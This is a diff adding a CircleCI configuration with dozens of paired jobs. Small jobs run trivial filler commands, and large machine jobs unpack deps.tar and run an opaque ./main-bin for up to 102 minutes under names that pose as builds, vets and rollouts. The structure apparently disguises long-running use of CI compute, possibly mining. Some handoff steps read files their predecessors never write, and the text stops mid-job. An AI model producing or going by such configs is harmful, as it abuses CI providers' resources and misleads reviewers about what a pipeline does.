@@ -1,0 +1,1921 @@
+version: 2.1
+
+jobs:
+  postbuild_foxtrot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nova spark
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/ci-ws/buffer.dat
+            echo "gate foxtrot: $(wc -c </tmp/ci-ws/buffer.dat) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.dat
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  D_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: noise floor
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && head -c 1024 /dev/urandom > "$tf" && sha1sum "$tf" | cut -d' ' -f1 && rm "$tf"; true ; } > /tmp/ci-ws/handoff.state
+            echo "gate sanity: $(wc -c </tmp/ci-ws/handoff.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - handoff.state
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/handoff.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  package_fix-session-reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: situp
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/ci-ws/6.out
+            echo "gate fix-session-reload: $(wc -c </tmp/ci-ws/6.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 6.out
+  fix-session-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/6.out
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  reload_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: foam roll
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 921600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/ci-ws/buffer.blob
+            echo "gate rollout: $(wc -c </tmp/ci-ws/buffer.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.blob
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/buffer.blob
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  precheck_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: primer base
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tf=$(mktemp -d) && touch "$tf/x" "$tf/y" "$tf/z" && ls "$tf" | wc -l && rm -rf "$tf"; true ; } > /tmp/ci-ws/.pid
+            echo "gate fire-up: $(wc -c </tmp/ci-ws/.pid) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .pid
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/.pid
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  stepB_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: middle layer
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 20 | awk '{if($1>10)print}' | awk '{sum+=$1}END{print sum}'; true ; } > /tmp/ci-ws/step-21.log
+            echo "gate preview: $(wc -c </tmp/ci-ws/step-21.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-21.log
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/step-21.log
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  phase_full-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spiral up
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=8;i++){for(j=1;j<=i;j++)printf "*"; print ""}}'; true ; } > /tmp/ci-ws/checkpoint-v2.pkl
+            echo "gate full-send: $(wc -c </tmp/ci-ws/checkpoint-v2.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - checkpoint-v2.pkl
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/checkpoint-v2.pkl
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  step1_bun-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: surface float
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo ${PATH:0:16}; true ; } > /tmp/ci-ws/.ready
+            echo "gate bun-ship: $(wc -c </tmp/ci-ws/.ready) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .ready
+  bun-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  phase2_dotnet8-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dnd off
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=360;i+=90) print i, sin(i*0.01745)}' | wc -l; true ; } > /tmp/ci-ws/trace.txt
+            echo "gate dotnet8-build: $(wc -c </tmp/ci-ws/trace.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - trace.txt
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/trace.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  kick_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: feral check
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes abc | head -n 152056 | sha256sum; true ; } > /tmp/ci-ws/buffer.raw
+            echo "gate defualt: $(wc -c </tmp/ci-ws/buffer.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.raw
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/buffer.raw
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  builder_add-login-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: whoosh
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes "abcd" | head -200 | md5sum; true ; } > /tmp/ci-ws/FINAL.txt
+            echo "gate add-login-leak: $(wc -c </tmp/ci-ws/FINAL.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - FINAL.txt
+  add-login-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  p2_rust-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: scribble
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2836800;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/ci-ws/handover.ok
+            echo "gate rust-vet: $(wc -c </tmp/ci-ws/handover.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - handover.ok
+  rust-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/handover.ok
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  generate_callisto-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rocket stove
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)s=s"-"i; print s}'; true ; } > /tmp/ci-ws/report.txt
+            echo "gate callisto-ng: $(wc -c </tmp/ci-ws/report.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.txt
+  callisto-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/report.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  resync_check-nightly-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: banner up
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/ci-ws/pt-D.pkl
+            echo "gate check-nightly-integration-tests: $(wc -c </tmp/ci-ws/pt-D.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - pt-D.pkl
+  check-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/pt-D.pkl
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  auditor_java17-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "key: value" | sed 's/^.*: //'; true ; } > /tmp/ci-ws/813.out
+            echo "gate java17-fmt: $(wc -c </tmp/ci-ws/813.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 813.out
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/813.out
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  wire_push-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dropoff peak
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 100 /dev/urandom | sha224sum 2>/dev/null | awk '{print $1}' | head -c 20 || head -c 100 /dev/urandom | sha256sum | awk '{print $1}' | head -c 20; true ; } > /tmp/ci-ws/2023-12-16.data
+            echo "gate push-it: $(wc -c </tmp/ci-ws/2023-12-16.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2023-12-16.data
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/2023-12-16.data
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  syncer_titan-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dropped stitch
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | od -An -tu8 | head -1 | awk '{print $1}'; true ; } > /tmp/ci-ws/gate-complete.txt
+            echo "gate titan-plus: $(wc -c </tmp/ci-ws/gate-complete.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - gate-complete.txt
+  titan-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/gate-complete.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  inspect_rm-session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: RUN THIS
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ps -eo state 2>/dev/null | sort | uniq -c; true ; } > /tmp/ci-ws/relay.ok
+            echo "gate rm-session: $(wc -c </tmp/ci-ws/relay.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - relay.ok
+  rm-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  drain_oct20-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: famished
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1228800 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/ci-ws/129.out
+            echo "gate oct20-rev: $(wc -c </tmp/ci-ws/129.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 129.out
+  oct20-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/129.out
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  phase_green-light-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: waltz three
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo $(ls /usr/bin | wc -l); true ; } > /tmp/ci-ws/cache.raw
+            echo "gate green-light-go: $(wc -c </tmp/ci-ws/cache.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - cache.raw
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/cache.raw
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  enqueue_anothr-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 1048576 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/ci-ws/39.log
+            echo "gate anothr-run: $(wc -c </tmp/ci-ws/39.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 39.log
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/39.log
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  loader_nov27-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: cov
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 15 | awk '{if($1%3==0 && $1%5==0)print "FizzBuzz"; else if($1%3==0)print "Fizz"; else if($1%5==0)print "Buzz"; else print $1}' | wc -l; true ; } > /tmp/ci-ws/trace.log
+            echo "gate nov27-ship: $(wc -c </tmp/ci-ws/trace.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - trace.log
+  nov27-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  fixture_run-nightly-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: retrograde
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "x=5" | awk -F= '{print $2*2}'; true ; } > /tmp/ci-ws/report.out
+            echo "gate run-nightly-docker-image: $(wc -c </tmp/ci-ws/report.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.out
+  run-nightly-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/FINAL.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  prep_tweak-router-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dune drift
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_s && echo "data" > /tmp/_s/a && wc -c /tmp/_s/a && rm -rf /tmp/_s; true ; } > /tmp/ci-ws/2024-11-02.data
+            echo "gate tweak-router-glitch: $(wc -c </tmp/ci-ws/2024-11-02.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2024-11-02.data
+  tweak-router-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pick up handoff
+          command: |
+            cat /tmp/ci-ws/2024-11-02.data
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: tar -xf deps.tar
+      - run:
+          name: Cooldown
+          command: sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          command: sleep 30
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./main-bin
+  cook_zulu-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dull edge
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)for(j=1;j<=50;j++)s++;print s}'; true ; } > /tmp/ci-ws/payload.bin
+            echo "gate zulu-8: $(wc -c </tmp/ci-ws/payload.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - payload.bin
